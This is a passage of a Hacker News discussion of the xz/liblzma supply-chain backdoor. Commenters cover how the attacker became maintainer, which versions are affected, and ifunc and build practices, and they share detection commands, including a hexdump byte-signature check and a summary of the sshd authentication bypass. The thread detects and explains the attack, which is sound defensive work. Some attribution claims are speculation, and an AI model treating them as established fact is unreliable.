underneath. An attacker took over of the project slowly and stayed dormant until recently. | | --- | --- | --- | | | |  |  | [johnklos](user?id=johnklos) [9 months ago](item?id=39868335)   | [parent](#39868169) | [next](#39873699) [–]  Except that doesn't match reality. Someone has worked on xz for several years. Are you saying that this somewhat active contributor was likely actively contributing, then all of a sudden stopped, also stopped paying attention, and also allowed their account to be compromised or otherwise handed it over to a nefarious party? That fails the sniff test. | | --- | --- | --- | | | |  |  | [c\_rrodriguez](user?id=c_rrodriguez) [9 months ago](item?id=39868541)   | [root](#39868169) | [parent](#39868335) | [next](#39873699) [–]  See, people drop dead from OSS projects pretty frecuently, usually because they take on other life responsabilities and there is no cushion or guard against a bus factor. Then it is very easy to get credentials compromised or have your project took over by someone else. | | --- | --- | --- | | | |  |  | [ColonelPhantom](user?id=ColonelPhantom) [9 months ago](item?id=39873699)   | [parent](#39868169) | [prev](#39868335) | [next](#39871138) [–]  Well, yeah. The attacker, operating largely under the name Jia Tan, has successfully manipulated the original author (Lasse Collin) to become a maintainer. The attacker indeed laid dormant for two years, pretending to just be maintaining xz. I really don't see any way how this wasn't malice on Jia's part. But I do think your hypothesis applies to Lasse, who was just happy someone could help him maintain xz. | | --- | --- | --- | | | |  |  | [dkarras](user?id=dkarras) [9 months ago](item?id=39871138)   | [parent](#39868169) | [prev](#39873699) | [next](#39868821) [–]  funding model of OSS work is obviously a problem, but these problems are deeper than that. even a very well compensated OSS developer can get a knock on the door from a government agency (or anyone with a "$5 wrench")[1] and they might feel "compelled" to give up their maintainer creds. [1]: <https://xkcd.com/538/> | | --- | --- | --- | | | |  |  | [autoexecbat](user?id=autoexecbat) [9 months ago](item?id=39868821)   | [prev](#39868169) | [next](#39868157) [–]  I'm really curious about if the act of injecting a backdoor into OSS software is legal/illegal ? Are they somehow in the clear unless we can show they actively exploited it? | | --- | --- | --- | | | |  |  | [mnau](user?id=mnau) [9 months ago](item?id=39869151)   | [parent](#39868821) | [next](#39876246) [–]  Probably depends on criminal code a country. Mine does (EU country): > Section 231 Obtaining and Possession of Access Device and Computer System Passwords and other such Data > (1) Whoever with the intent to commit a criminal offence of Breach of secrecy of correspondence [...] or a criminal offence of Unauthorised access to computer systems and information media [...] *produces*, *puts into circulation*, imports, exports, transits, offers, provides, sells, or otherwise makes available, obtains for him/herself or for another, or handles > a) a device or *its component*, process, instrument or any other means, including *a computer programme designed or adapted for unauthorised access to electronic communications networks, computer system* or a part thereof, or > b) a computer password, access code, data, process or any other similar means by which it is possible to gain access to a computer system or a part thereof, shall be sentenced .. (1 year as an individual, 3 years as a member of a organized group) | | --- | --- | --- | | | |  |  | [Culonavirus](user?id=Culonavirus) [9 months ago](item?id=39876246)   | [parent](#39868821) | [prev](#39869151) | [next](#39868157) [–]  The way I see it: People are being charged for their speech all the time. Especially outside the US, but even in the US. And code is speech. And that is even before all the hacking/cracking/espionage laws get involved. There's a reason all the (sane) people doing grey/black hat work take their security and anonymity extremely seriously. | | --- | --- | --- | | | |  |  | [jcalvinowens](user?id=jcalvinowens) [9 months ago](item?id=39868157)   | [prev](#39868821) | [next](#39876130) [–]  Oof, this is on my Sid laptop: ```   {0}[calvinow@mozart ~] dpkg-query -W liblzma5   liblzma5:amd64  5.6.0-0.2   {0}[calvinow@mozart ~] hexdump -ve '1/1 "%.2x"' /lib/x86_64-linux-gnu/liblzma.so.5 | grep -c f30f1efa554889f54c89ce5389fb81e7000000804883ec28488954241848894c2410   1  ``` Glad I stopped running sshd on my laptop a long time ago... still probably going to reinstall :/ | | --- | --- | --- | | | |  |  | [msm\_](user?id=msm_) [9 months ago](item?id=39868988)   | [parent](#39868157) | [next](#39876130) [–]  No obvious need to reinstall if you didn't use ssh *and* expose it publicly *and* are not a politically important person. All signs suggest that it was a nation state attack, and you are likely not a target. | | --- | --- | --- | | | |  |  | [jcalvinowens](user?id=jcalvinowens) [9 months ago](item?id=39869035)   | [root](#39868157) | [parent](#39868988) | [next](#39876130) [–]  We'll see... given that sshd is just one of many possible argv[0] it may have choosen to act on, I'm going to be a little paranoid until it's been fully analyzed. It just takes half an hour to reinstall, I have some shows to catch up on anyway :) | | --- | --- | --- | | | |  |  | [frenchman99](user?id=frenchman99) [9 months ago](item?id=39872964)   | [root](#39868157) | [parent](#39869035) | [next](#39876130) [–]  I was thinking about reinstalling, because I'm on Manjaro Linux, which has the version in question. But it's unclear if earlier versions are also vulnerable. And if it did nasty things to your machine, how do you make sure that the backups you have do not include ways for the backdoor to reinstate itself? | | --- | --- | --- | | | |  |  | [jcalvinowens](user?id=jcalvinowens) [9 months ago](item?id=39876682)   | [root](#39868157) | [parent](#39872964) | [next](#39876130) [–]  Sure, the backdoor could have e.g. injected an libav exploit into a video file to re-backdoor my system when I watch it... that's too paranoid for me. I don't backup the whole system, just a specific list of things in /home. | | --- | --- | --- | | | |  |  | [costco](user?id=costco) [9 months ago](item?id=39876130)   | [prev](#39868157) | [next](#39872615) [–]  Anyone have any idea what the code in the malicious liblzma\_la-crc64-fast.o is actually doing? It's difficult to follow statically. | | --- | --- | --- | | | |  |  | [Retr0id](user?id=Retr0id) [9 months ago](item?id=39872615)   | [prev](#39876130) | [next](#39870151) [–]  The `pack`[0] compression utility that reached the HN front page the other day[1] is setting off my alarm bells right now. (It was at the time too, but now doubly so) It's written in Pascal, and the only (semi-)documented way to build it yourself is to use a graphical IDE, and pull in pre-compiled library binaries (stored in the git repo of a dependency which afaict Pack is the only dependent of - appears to be maintained by the same pseudonymous author but from a different account). I've opened an issue[2] outlining my concerns. I'm certainly not accusing them of having backdoored binaries, but *if* I was setting up a project to be deliberately backdoorable, it'd look a lot like this. [0] <https://pack.ac/> [1] <https://news.ycombinator.com/item?id=39793805> [2] <https://github.com/PackOrganization/Pack/issues/10> | | --- | --- | --- | | | |  |  | [MaximilianEmel](user?id=MaximilianEmel) [9 months ago](item?id=39870151)   | [prev](#39872615) | [next](#39869755) [–]  We need to get these complex & bloated build-systems under control. | | --- | --- | --- | | | |  |  | [77pt77](user?id=77pt77) [9 months ago](item?id=39876910)   | [parent](#39870151) | [next](#39869755) [–]  What we need is to move away from 1970s build tools. | | --- | --- | --- | | | |  |  | [haolez](user?id=haolez) [9 months ago](item?id=39869755)   | [prev](#39870151) | [next](#39867405) [–]  I'm not trying to troll, but I'm wondering if a distro like Gentoo is less susceptible to such attacks, since the source code feels more transparent with their approach. But then again, it seems that upstream was infected in this case, so I'm not sure if a culture of compiling from source locally would help. | | --- | --- | --- | | | |  |  | [StressedDev](user?id=StressedDev) [9 months ago](item?id=39872223)   | [parent](#39869755) | [next](#39867405) [–]  It is not going to make a difference. If you run malicious code, you will get hacked. Compiling the code yourself does not prevent the code from being malicious. The one it might help is it might make it easier to find the back door once you know there is one. | | --- | --- | --- | | | |  |  | [crispyambulance](user?id=crispyambulance) [9 months ago](item?id=39867405)   | [prev](#39869755) | [next](#39882076) [–]  I am not embarrassed to say... is there anything in there that someone who runs a server with ssh needs to know? I literally can't make heads or tails of the risk here. All I see is the very alarming and scary words "backdoor" and "ssh server" in the same sentence. If I am keeping stuff up to date, is there anything at all to worry about? | | --- | --- | --- | | | |  |  | [pxx](user?id=pxx) [9 months ago](item?id=39867625)   | [parent](#39867405) | [next](#39872926) [–]  You should probably not be running your own publicly-accessible ssh servers if this email is not sufficient to at least start figuring out what your next actions are. The email itself comes with an evaluation script to figure out if anything is currently vulnerable to specifically this discovery. For affected distributions, openssh servers may have been backdoored for at least the past month. | | --- | --- | --- | | | |  |  | [crispyambulance](user?id=crispyambulance) [9 months ago](item?id=39869330)   | [root](#39867405) | [parent](#39867625) | [next](#39871056) [–]  Yet here I am, getting up every morning and getting dressed and tying my shoes all by myself, and then maintaining a small number of servers that have openssh on them! Thanks, though, for pointing out the little script at the very end of that technical gauntlet of an email intended for specialists. I had gotten through the first 3 or 4 paragraphs and had given up. What I should have done is just googled CVE-2024-3094, whatever, still glad I asked. | | --- | --- | --- | | | |  |  | [ShamelessC](user?id=ShamelessC) [9 months ago](item?id=39871056)   | [root](#39867405) | [parent](#39867625) | [prev](#39869330) | [next](#39872926) [–]  > You should probably not be running your own publicly-accessible ssh servers if this email is not sufficient to at least start figuring out what your next actions are. That seems like a fairly unreasonable stance. | | --- | --- | --- | | | |  |  | [frenchman99](user?id=frenchman99) [9 months ago](item?id=39872974)   | [root](#39867405) | [parent](#39871056) | [next](#39872926) [–]  Not at all. For instance, I don't know what the next steps are, but I run SSH servers behind Wireguard, exactly to prevent them being accessible in the case of such events. Wireguard is simple to setup, even if I lack the expertise to understand exactly how to go forward. | | --- | --- | --- | | | |  |  | [dualbus](user?id=dualbus) [9 months ago](item?id=39872926)   | [parent](#39867405) | [prev](#39867625) | [next](#39882076) [–]  > I literally can't make heads or tails of the risk here. All I see is the very alarming and scary words "backdoor" and "ssh server" in the same sentence. From what I've read, there is still lots of unknowns about the scope of the problem. What has been uncovered so far indicates it involves bypassing authentication in SSH. In [https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78b...](https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27), Sam James points out > If this payload is loaded in openssh sshd, the RSA\_public\_decrypt function will be redirected into a malicious implementation. We have observed that this malicious implementation can be used to bypass authentication. Further research is being done to explain why. Thus, an attacker maybe could use this to connect to vulnerable servers without needing to authenticate at all. | | --- | --- | --- | | | |  |  | [crispyambulance](user?id=crispyambulance) [9 months ago](item?id=39874855)   | [root](#39867405) | [parent](#39872926) | [next](#39882076) [–]  Thanks, that gist is a really lucid explanation for normal folks. | | --- | --- | --- | | | |  |  | [joshhansen](user?id=joshhansen) [9 months ago](item?id=39882076)   | [prev](#39867405) | [next](#39866037) [–]  Is it time to deprecate the ability for code to implement linker symbols in other libraries? Shouldn't there be a strict namespace separation between binaries/libraries? liblzma being to implement openssh symbols seems like a symptom of a much larger problem. | | --- | --- | --- | | | |  |  | [jeffbee](user?id=jeffbee) [9 months ago](item?id=39866037)   | [prev](#39882076) | [next](#39871702) [–]  Safety through obscurity and weirdness! If you disable ifunc, like any sensible person, this backdoor disables itself. | | --- | --- | --- | | | |  |  | [travem](user?id=travem) [9 months ago](item?id=39866749)   | [parent](#39866037) | [next](#39866506) [–]  Interesting, I used <https://ossinsight.io/analyze/JiaT75> to identify contributions from the account used by author of the backdoor. It looks like the account made other potentially problematic contributions to other projects. The disabling of ifunc in this PR against Google's oss-fuzz project maybe one way they tried to prevent this particular backdoor being flagged by that tool? <https://github.com/google/oss-fuzz/pull/10667> | | --- | --- | --- | | | |  |  | [mxmlnkn](user?id=mxmlnkn) [9 months ago](item?id=39867339)   | [root](#39866037) | [parent](#39866749) | [next](#39866506) [–]  There is a related issue for LLVM/clang by this person: <https://github.com/llvm/llvm-project/issues/63957> | | --- | --- | --- | | | |  |  | [est](user?id=est) [9 months ago](item?id=39874594)   | [root](#39866037) | [parent](#39867339) | [next](#39866506) [–]  I am curious, why don't this clever hacker create multiple accounts instead of only this "JiaT75" | | --- | --- | --- | | | |  |  | [selckin](user?id=selckin) [9 months ago](item?id=39866506)   | [parent](#39866037) | [prev](#39866749) | [next](#39866144) [–]  <https://github.com/google/oss-fuzz/pull/10667> | | --- | --- | --- | | | |  |  | [prydt](user?id=prydt) [9 months ago](item?id=39866144)   | [parent](#39866037) | [prev](#39866506) | [next](#39870762) [–]  I'm curious now. What is ifunc? (Had difficulty finding it through a search) | | --- | --- | --- | | | |  |  | [jeffbee](user?id=jeffbee) [9 months ago](item?id=39866193)   | [root](#39866037) | [parent](#39866144) | [next](#39866215) [–]  ifunc is a GNU method of interposing function calls with platform-optimized versions of the function. It is used to detect CPU features at runtime and insert, for example, AVX2-optimized versions of memcmp. It is seen in crypto a lot, because CPUs have many crypto-specific instructions. However, I don't like it much and I think software should be compiled for the target machine in the first place. My 1 hardened system that is reachable from the public network is based on musl, built mostly with llvm, and with ifunc disabled. | | --- | --- | --- | | | |  |  | [cesarb](user?id=cesarb) [9 months ago](item?id=39866447)   | [root](#39866037) | [parent](#39866193) | [next](#39866496) [–]  > However, I don't like it much and I think software should be compiled for the target machine in the first place. That means you either have to compile software locally on each machine, or you have a combinatorial explosion of possible features. Compiling locally has several drawbacks. It needs the full compilation environment installed on every machine, which uses a lot of disk space, and some security people dislike it (because then attackers can also compile software locally on that machine); compiling needs a lot of memory and disk space, and uses a lot of processor time and electric power. It also means that signature schemes which only allow signed code cannot be used (or you need to have the signing key available on the target machine, making it somewhat pointless). The combinatorial explosion of features has been somewhat tamed lately, by bundling sets of feature into feature levels (x86\_64-v1, etc), but that still quadruples the amount of compiled code to be distributed, and newer features still have to be selected at runtime. | | --- | --- | --- | | | |  |  | [myself248](user?id=myself248) [9 months ago](item?id=39866556)   | [root](#39866037) | [parent](#39866447) | [next](#39867020) [–]  Compiled \_on\_ and compiled \_for\_ are not the same. There must be a way to go to the target machine, get some complete dump of CPU features, copy that to the compile-box, do the build, and copy the resulting binaries back. | | --- | --- | --- | | | |  |  | [derefr](user?id=derefr) [9 months ago](item?id=39867020)   | [root](#39866037) | [parent](#39866447) | [prev](#39866556) | [next](#39866538) [–]  > That means you either have to compile software locally on each machine, or you have a combinatorial explosion of possible features. Or you just have to buy a lot of the exact same hardware. Secure installations tend to do that. | | --- | --- | --- | | | |  |  | [jeffbee](user?id=jeffbee) [9 months ago](item?id=39866538)   | [root](#39866037) | [parent](#39866447) | [prev](#39867020) | [next](#39870705) [–]  I don't think you can really say it is "combinatorial" because there's not a mainstream machine with AES-NI but not, say, SSSE3. In any case if there were such a machine you don't need to support it. The one guy with that box can do scratch builds. | | --- | --- | --- | | | |  |  | [afh1](user?id=afh1) [9 months ago](item?id=39870705)   | [root](#39866037) | [parent](#39866447) | [prev](#39866538) | [next](#39866496) [–]  I have no issues compiling everything on my Gentoo box. | | --- | --- | --- | | | |  |  | [eklitzke](user?id=eklitzke) [9 months ago](item?id=39866496)   | [root](#39866037) | [parent](#39866193) | [prev](#39866447) | [next](#39866215) [–]  Obviously compiling for the target architecture is best, but for most software (things like crypto libraries excluded) 95% of the benefit of AVX2 is going to come from things like vectorized memcpy/memcmp. Building glibc using ifuncs to provide optimized implementations of these routines gives most users most of the benefit of AVX2 (or whatever other ISA extension) while still distributing binaries that work on older CPU microarchitectures. | | --- | --- | --- | | | |  |  | [jeffbee](user?id=jeffbee) [9 months ago](item?id=39866578)   | [root](#39866037) | [parent](#39866496) | [next](#39869369) [–]  ifunc memcpy also makes short copies suck ass on those platforms, since the dispatch cost dominates regardless of the vectorization. It's an open question whether ifunc helps or harms the performance of general use cases. By "open question" I meant that there is compelling research indicating that GNU memcpy/memcmp is counterproductive, but the general Linux-using public did not get the memo. [https://storage.googleapis.com/gweb-research2023-media/pubto...](https://storage.googleapis.com/gweb-research2023-media/pubtools/pdf/e52f61fd2c51e8962305120548581efacbc06ffc.pdf) "AsmDB: Understanding and Mitigating Front-End Stalls in Warehouse-Scale Computers" Section 4.4 "Memcmp and the perils of micro-optimization" | | --- | --- | --- | | | |  |  | [wiml](user?id=wiml) [9 months ago](item?id=39869369)   | [root](#39866037) | [parent](#39866496) | [prev](#39866578) | [next](#39866215) [–]  On the other hand, it also means that your distro can supply a microarchitecture-specific libc and every program automatically gets the memcpy improvements. (Well, except for the golang/rust people.) Wasn't this the point of Gentoo, back in the day? It was more about instruction scheduling and register allocation differences, but your system would be built with everything optimized for your uarch. | | --- | --- | --- | | | |  |  | [aaronmdjones](user?id=aaronmdjones) [9 months ago](item?id=39866215)   | [root](#39866037) | [parent](#39866144) | [prev](#39866193) | [next](#39870762) [–]  <https://sourceware.org/glibc/wiki/GNU_IFUNC> | | --- | --- | --- | | | |  |  | [afh1](user?id=afh1) [9 months ago](item?id=39870762)   | [parent](#39866037) | [prev](#39866144) | [next](#39866461) [–]  Interestingly: [https://github.com/tukaani-project/xz/issues/62#issuecomment...](https://github.com/tukaani-project/xz/issues/62#issuecomment-1719489932) | | --- | --- | --- | | | |  |  | [canada\_dry](user?id=canada_dry) [9 months ago](item?id=39866461)   | [parent](#39866037) | [prev](#39870762) | [next](#39871702) [–]  Is there a way to easily/reliably disable ifunc globally on a system (e.g. ubuntu/debian) without breaking a bunch of things? FYI this looks for pkgs with liblzma: > dpkg -l |grep liblzma Versions >= 5.6 are compromised | | --- | --- | --- | | | |  |  | [BobbyTables2](user?id=BobbyTables2) [9 months ago](item?id=39871702)   | [prev](#39866037) | [next](#39868074) [–]  Why doesn’t GitHub force “releases” to be a simple repo tarball for sources and with binaries from GitHub actions or such… I find it incredibly ironic that a “version control” site gives no assurance of reproducible builds (nor reproducible source!!) The real villain is not the perpetrator, it is Microsoft, and it is all of us. | | --- | --- | --- | | | |  |  | [Brian\_K\_White](user?id=Brian_K_White) [9 months ago](item?id=39872777)   | [parent](#39871702) | [next](#39872224) [–]  Too inflexible ideological. There are infinite things that most properly belong in a release file and not in the source, that can't be generated from that source by github actions, and seperately no one should be compelled to use github actions. | | --- | --- | --- | | | |  |  | [cryptonector](user?id=cryptonector) [9 months ago](item?id=39872224)   | [parent](#39871702) | [prev](#39872777) | [next](#39868074) [–]  Because then for autoconf codebases you have to commit `./configure` or you have to require that users have autoconf installed and run `autoreconf -fi` first. Maybe autoconf-using projects should really just require that users have autoconf installed. Not that that would prevent backdoors, mind you. | | --- | --- | --- | | | |  |  | [dpkirchner](user?id=dpkirchner) [9 months ago](item?id=39875461)   | [root](#39871702) | [parent](#39872224) | [next](#39868074) [–]  If committing configure is objectionable, perhaps there could be "service" repositories that are not directly writable and are guaranteed to be nothing more than the base repo + autoconf cruft used to generate the releases. | | --- | --- | --- | | | |  |  | [cryptonector](user?id=cryptonector) [9 months ago](item?id=39876756)   | [root](#39871702) | [parent](#39875461) | [next](#39868074) [–]  Well, for example in jq we do commit bison/flex outputs because for users ensuring that they have the right version of those can be tricky. We could do the same w.r.t. autoconf and its outputs, though again, that won't preclude backdoors. | | --- | --- | --- | | | |  |  | [dpkirchner](user?id=dpkirchner) [9 months ago](item?id=39876977)   | [root](#39871702) | [parent](#39876756) | [next](#39868074) [–]  Yeah, it's less about detecting backdoors specifically and more about having a way to compare releases to build jobs. | | --- | --- | --- | | | |  |  | [cryptonector](user?id=cryptonector) [9 months ago](item?id=39877629)   | [root](#39871702) | [parent](#39876977) | [next](#39868074) [–]  Committing built artifacts presents similar problems: how do you know that the committed artifacts are in fact derived from their sources? Or from non-backdoored versions of build tools for that matter? Hello Ken Thompson attacks. I don't believe there's a nice easy answer to these questions. What we do in jq is rely on GitHub Actions to run the build and `make dist`. In fact, we could now stop committing the bison/flex outputs, too, since we can make sure that the tarball includes them. We do also publish the git repo snapshots that GitHub auto-generates for releases, though we do that because GitHub doesn't give one a choice. | | --- | --- | --- | | | |  |  | [dpkirchner](user?id=dpkirchner) [9 months ago](item?id=39878164)   | [root](#39871702) | [parent](#39877629) | [next](#39868074) [–]  Thinking about this more: maybe there would be some benefit to GitHub taking control of "release" repositories that may only be written to be GA. They'd write everything -- maybe as a docker image -- so anyone could pull down the image and compare shas, or whatever. And maybe this could also be done by their competitors. The ultimate goal would be to have multiple trusted parties performing the build on the same code producing the same output, and allowing any randos to do the same. If the source is included in those images, we could conceivably prove that the target was based on the source. It's not nice and easy, true. | | --- | --- | --- | | | |  |  | [wannacboatmovie](user?id=wannacboatmovie) [9 months ago](item?id=39868074)   | [prev](#39871702) | [next](#39871246) [–]  Really disappointed in the number of posters here who are playing down rushing to judgement and suggesting perhaps a legitimate developer was compromised, when it's very clear this is sophisticated and not the work of a single person. I'm recalling bad memories of the Juniper backdoor years ago. Whoever did this, was playing the long game. As the top post pointed out, there was an effort to get this into Fedora.... which eventually makes its way into RHEL (read: high value targets). This was not for short term payoffs by some rogue developer trying to mine crypto or other such nonsense. What you are seeing here is the planting of seeds for something months or a year down the road. | | --- | --- | --- | | | |  |  | [Brian\_K\_White](user?id=Brian_K_White) [9 months ago](item?id=39871246)   | [prev](#39868074) | [next](#39875645) [–]  It doesn't really relate to this issue other than that both issues share a common source, but I wish we'd never fallen for xz. I agree with the lzip guy <https://www.nongnu.org/lzip/xz_inadequate.html> | | --- | --- | --- | | | |  |  | [qxfys](user?id=qxfys) [9 months ago](item?id=39875645)   | [prev](#39871246) | [next](#39867182) [–]  So, it's been almost 24 hours since I read this yesterday. Is it confirmed that Jia Tan is the perpetrator? do we know who he/she really is? Or are we going to live for the rest of our lives only knowing the pseudo name? just like Satoshi Nakamoto did to us. ;) | | --- | --- | --- | | | |  |  | [n3uman](user?id=n3uman) [9 months ago](item?id=39867182)   | [prev](#39875645) | [next](#39867427) [–]  [https://github.com/tukaani-project/tukaani-project.github.io...](https://github.com/tukaani-project/tukaani-project.github.io/commit/743dc204551ecccf831108bb33ad1ee00116b58e) Does this mean anything that it changed to a parameter?? | | --- | --- | --- | | | |  |  | [danielhlockard](user?id=danielhlockard) [9 months ago](item?id=39868340)   | [parent](#39867182) | [next](#39867427) [–]  no. unlikely. | | --- | --- | --- | | | |  |  | [sschueller](user?id=sschueller) [9 months ago](item?id=39867427)   | [prev](#39867182) | [next](#39872129) [–]  So much for a quiet Easter holiday. Fuck | | --- | --- | --- | | | |  |  | [BarbaryCoast](user?id=BarbaryCoast) [9 months ago](item?id=39872129)   | [prev](#39867427) | [next](#39868939) [–]  There's a bug in the detection script. The line: if [ "$path" == "" ] should be if [ "$path" = "" ] | | --- | --- | --- | | | |  |  | [dualbus](user?id=dualbus) [9 months ago](item?id=39876331)   | [parent](#39872129) | [next](#39868939) [–]  Bash accepts both variants of the equality operator. So it is not a bug. | | --- | --- | --- | | | |  |  | [vasili111](user?id=vasili111) [9 months ago](item?id=39868939)   | [prev](#39872129) | [next](#39878329) [–]  Could anyone please tell me if current stable version of Debian has that backdoor or not? | | --- | --- | --- | | | |  |  | [yabones](user?id=yabones) [9 months ago](item?id=39869213)   | [parent](#39868939) | [next](#39869295) [–]  Debian stable has 5.4.1, the backdoored versions are 5.6.0-5.6.1 <https://packages.debian.org/bookworm/xz-utils> <https://packages.debian.org/bookworm/liblzma5> | | --- | --- | --- | | | |  |  | [teddyh](user?id=teddyh) [9 months ago](item?id=39869295)   | [parent](#39868939) | [prev](#39869213) | [next](#39869248) [–]  It does *not* contain the backdoor: <<https://security-tracker.debian.org/tracker/CVE-2024-3094>< | | --- | --- | --- | | | |  |  | [anononaut](user?id=anononaut) [9 months ago](item?id=39869248)   | [parent](#39868939) | [prev](#39869295) | [next](#39878329) [–]  Debian Stable seems to be in the clear. [https://lists.debian.org/debian-security-announce/2024/msg00...](https://lists.debian.org/debian-security-announce/2024/msg00057.html) | | --- | --- | --- | | | |  |  | [ptx](user?id=ptx) [9 months ago](item?id=39878329)   | [prev](#39868939) | [next](#39871958) [–]  Python for Windows bundles liblzma from this project, but it appears to be version 5.2.5 [0] vendored into the Python project's repo on 2022-04-18 [1], so that should be fine, right? [0] [https://github.com/python/cpython/blob/main/PCbuild/get\_exte...](https://github.com/python/cpython/blob/main/PCbuild/get_externals.bat) [1] <https://github.com/python/cpython-source-deps/tree/xz> | | --- | --- | --- | | | |  |  | [17e55aab](user?id=17e55aab) [9 months ago](item?id=39871958)   | [prev](#39878329) | [next](#39880331) [–]  a user offered 5.6.0 and 5.4.5 in an issue to microsoft/vcpkg 5.4.5 can be compromised <https://github.com/microsoft/vcpkg/issues/37197> | | --- | --- | --- | | | |  |  | [croemer](user?id=croemer) [9 months ago](item?id=39880331)   | [prev](#39871958) | [next](#39869146) [–]  Which nation state (if any) is most likely behind this? China based on name, or is this a red herring? The perpetrator did most GitHub actions between 10 and 18 UTC, which sort of rules out US based, unless the messages were scheduled. Consistent with Europe to Asia. See clickhouse for data: [https://play.clickhouse.com/play?user=play#U0VMRUNUICogRlJPT...](https://play.clickhouse.com/play?user=play#U0VMRUNUICogRlJPTSBnaXRodWJfZXZlbnRzIFdIRVJFIGFjdG9yX2xvZ2luPSdKaWFUNzUnIE9SREVSIEJZIGZpbGVfdGltZSBERVND) | | --- | --- | --- | | | |  |  | [rieter](user?id=rieter) [9 months ago](item?id=39908577)   | [parent](#39880331) | [next](#39869146) [–]  Could easily be someone in the EST time zone. There aren't that many events that would be earlier than 8am EST. | | --- | --- | --- | | | |  |  | [lacoolj](user?id=lacoolj) [9 months ago](item?id=39869146)   | [prev](#39880331) | [next](#39868948) [–]  What a disappointment. It's something always in the back of our minds as developers using public libraries, but when something like this happens, non-developers that hear about it start to associate it with the rest of the open-source community. It's essentially a terrorist attack on developer experience. Thankfully, management doesn't follow the same approach as the TSA. | | --- | --- | --- | | | |  |  | [kazinator](user?id=kazinator) [9 months ago](item?id=39868948)   | [prev](#39869146) | [next](#39873314) [–]  Doesn't this call for criminal charges? | | --- | --- | --- | | | |  |  | [mnau](user?id=mnau) [9 months ago](item?id=39869905)   | [parent](#39868948) | [next](#39873314) [–]  Good luck finding him/her. GitHub probably already gave feds all logs and IPs, but I would bet 100:1 that it's all going to be a VPN or something like that. | | --- | --- | --- | | | |  |  | [Dribble4633](user?id=Dribble4633) [9 months ago](item?id=39873314)   | [prev](#39868948) | [next](#39873410) [–]  Hello, Github just disabled the repo : <https://github.com/tukaani-project/xz> Do someone have an up to date fork to see the project history ? | | --- | --- | --- | | | |  |  | [\_zephyrus\_](user?id=_zephyrus_) [9 months ago](item?id=39873410)   | [prev](#39873314) | [next](#39873292) [–]  Is there any news concerning the payload analysis? Just curious to see if it can be correlated with something I have in my sshd logs (e.g. login attempt with specific RSA keys). | | --- | --- | --- | | | |  |  | [sirsinsalot](user?id=sirsinsalot) [9 months ago](item?id=39873292)   | [prev](#39873410) | [next](#39867095) [–]  I think we have to assume that all community software is a target. The payoff for bad actors is too great. For every one of these we spot, assume there are two we have not. | | --- | --- | --- | | | |  |  | [frankjr](user?id=frankjr) [9 months ago](item?id=39867095)   | [prev](#39873292) | [next](#39904776) [–]  Now consider that your average Linux distribution pulls in tens of thousands of packages, each of which can be similarly compromised. Pretty scary to think about. | | --- | --- | --- | | | |  |  | [RGamma](user?id=RGamma) [9 months ago](item?id=39868430)   | [parent](#39867095) | [next](#39870709) [–]  The terrible desktop software security model of weak/essentially non-existent security boundaries at run and compile time makes this all the more spicy. Computer security for billions runs on the simultaneous goodwill of many thousand contributors. Optimistically said it's actually a giant compliment to the programming community. And this is not even talking about hardware backdoors that are a million times worse and basically undetectable when done well. The myriad ways to betray user trust at any level of computation make me dizzy... | | --- | --- | --- | | | |  |  | [afh1](user?id=afh1) [9 months ago](item?id=39870709)   | [parent](#39867095) | [prev](#39868430) | [next](#39904776) [–]  I have exactly 719 packages on my Gentoo box, just rebuilt everything as part of the profile 23 upgrade. | | --- | --- | --- | | | |  |  | [3v1n0](user?id=3v1n0) [9 months ago](item?id=39904776)   | [prev](#39867095) | [next](#39871923) [–]  Also the attacker included in the 5.6.0 release the support for the long-awaited multi-threading decompression (and - broken - sandbox) making it very attractive to upgrade to... It was probably a tactic to give a reason to upgrade. It's not always a fault for those who did or tried to do. | | --- | --- | --- | | | |  |  | [65a](user?id=65a) [9 months ago](item?id=39871923)   | [prev](#39904776) | [next](#39867289) [–]  Is there a proper reverse engineering of the payload yet? | | --- | --- | --- | | | |  |  | [mdip](user?id=mdip) [9 months ago](item?id=39867289)   | [prev](#39871923) | [next](#39873151) [–]  Anyone keeping current with OpenSUSE Tumbleweed got a update...downgrade. Prior to `zypper dup --no-allow-vendor-change` I had 5.6.0, now I'm at 5.4.6. | | --- | --- | --- | | | |  |  | [intel\_brain](user?id=intel_brain) [9 months ago](item?id=39867408)   | [parent](#39867289) | [next](#39873151) [–]  I see `5.6.1.revertto5.4-3.2` | | --- | --- | --- | | | |  |  | [hcks](user?id=hcks) [9 months ago](item?id=39873151)   | [prev](#39867289) | [next](#39867380) [–]  It was caught out of luck due to performance degradation. So nobody reads the code - not even once- prior to merging into upstream supply chain? | | --- | --- | --- | | | |  |  | [hcks](user?id=hcks) [9 months ago](item?id=39873183)   | [parent](#39873151) | [next](#39867380) [–]  <https://x.com/bl4sty/status/1773780531143925959?s=20> So nobody reads releases notes either. But I’m sure this was a one off and were safe now | | --- | --- | --- | | | |  |  | [sylware](user?id=sylware) [9 months ago](item?id=39867380)   | [prev](#39873151) | [next](#39872338) [–]  This is why the less the better... even if it means less comfortable... to a certain point obviously. And that includes SDKs... | | --- | --- | --- | | | |  |  | [hgs3](user?id=hgs3) [9 months ago](item?id=39871851)   | [parent](#39867380) | [next](#39872338) [–]  I don't understand why you were downvoted. Having fewer moving parts does make it easier to catch issues. | | --- | --- | --- | | | |  |  | [sylware](user?id=sylware) [9 months ago](item?id=39873898)   | [root](#39867380) | [parent](#39871851) | [next](#39872338) [–]  Everything which is not engaging in licking Big Tech balls (open source or not) on HN is served with severe downvoting, that most of the time (probably real trash human beings or AI trolls with headless blink/geeko|webkit). | | --- | --- | --- | | | |  |  | [zeehio](user?id=zeehio) [9 months ago](item?id=39872338)   | [prev](#39867380) | [next](#39866016) [–]  On Ubuntu there is a bug report asking to sync the 5.6 version from Debian experimental [https://bugs.launchpad.net/ubuntu/+source/xz-utils/+bug/2055...](https://bugs.launchpad.net/ubuntu/%2Bsource/xz-utils/%2Bbug/2055422) | | --- | --- | --- | | | |  |  | [Rucadi](user?id=Rucadi) [9 months ago](item?id=39866016)   | [prev](#39872338) | [next](#39873259) [–]  Saw this on nix, which was using a compromised version in the unstable channel, I hope not too many systems are affected. | | --- | --- | --- | | | |  |  | [squarefoot](user?id=squarefoot) [9 months ago](item?id=39873259)   | [prev](#39866016) | [next](#39880606) [–]  State actor or not, let's not ignore that the backdoor has been discovered thanks to the open nature of the projects involved that allowed digging into the code. Just another example like the infamous Borland InterBase backdoor in the early 2K that remained dormant for years and was discovered months after the source code has been released. If the xz malware authors worked for any corp that produced closed source drivers or blobs 